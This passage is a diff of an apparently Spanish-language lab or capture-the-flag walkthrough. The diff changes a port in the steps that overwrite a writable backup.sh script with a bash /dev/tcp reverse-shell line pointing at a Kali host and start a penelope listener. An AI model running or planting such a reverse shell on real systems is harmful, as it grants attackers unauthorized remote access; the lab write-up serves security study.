@@ -75,12 +75,12 @@ Paso 2:
 
 Paso 3:
 ❯ echo '#!/bin/bash' > /var/www/scripts/backup.sh
-❯ echo 'bash -i >& /dev/tcp/IP_Kali/4444 0>&1' >> /var/www/scripts/backup.sh
+❯ echo 'bash -i >& /dev/tcp/IP_Kali/4455 0>&1' >> /var/www/scripts/backup.sh
 ❯ chmod +x /var/www/scripts/backup.sh
 
 Paso 4:
 # En Kali levantar el listener para recibir la revershell 
-❯ penelope -p 4444
+❯ penelope -p 4455
 ```
 
 ## Procesos actuales 
